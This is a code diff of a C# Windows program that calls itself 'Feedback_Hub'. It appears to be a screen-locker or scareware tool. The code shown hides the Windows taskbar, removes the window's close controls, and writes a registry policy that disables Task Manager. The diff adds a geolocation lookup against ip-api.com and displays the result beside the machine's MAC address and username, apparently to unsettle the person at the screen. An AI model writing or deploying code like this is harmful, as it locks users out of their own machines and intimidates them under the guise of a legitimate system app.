@@ -44,7 +44,7 @@ namespace Feedback_Hub
             this.ControlBox = false;
 
             int hwnd = FindWindow("Shell_TrayWnd", "");
-            ShowWindow(hwnd, SW_HIDE);
+            ShowWindow(hwnd, SW_HIDE);//hides task bar
 
             disable(); //disables task manager
         }
@@ -89,6 +89,10 @@ namespace Feedback_Hub
             // Set the text of the label to the MAC address
             label9.Text = "" + macAddress;
 
+            WebClient wc = new WebClient();
+            string geoip = wc.DownloadString("http://ip-api.com/json/");
+            richTextBox2.Text = geoip;
+
         }
 
         protected override void OnFormClosing(FormClosingEventArgs e)
@@ -120,11 +124,7 @@ namespace Feedback_Hub
             }
         }
 
-        private void button4_Click(object sender, EventArgs e)
-        {
-            string MachineName1 = Environment.UserName;
-            MessageBox.Show(System.Environment.UserName,null, MessageBoxButtons.OK, MessageBoxIcon.Information);
-        }
+        
 
         private void button2_Click(object sender, EventArgs e)
         {
@@ -166,6 +166,7 @@ namespace Feedback_Hub
         {
             label10.Text = DateTime.Now.ToLongTimeString();
             label11.Text = DateTime.Now.ToLongDateString();
+            label12.Text = DateTime.Now.ToLongDateString();
         }
 
         //close window overide
@@ -193,6 +194,12 @@ namespace Feedback_Hub
             RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
             if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                 objRegistryKey.SetValue("DisableTaskMgr", "1");
+        }
+
+        private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            string MachineName1 = Environment.UserName;
+            MessageBox.Show(System.Environment.UserName, null, MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
     }
 }
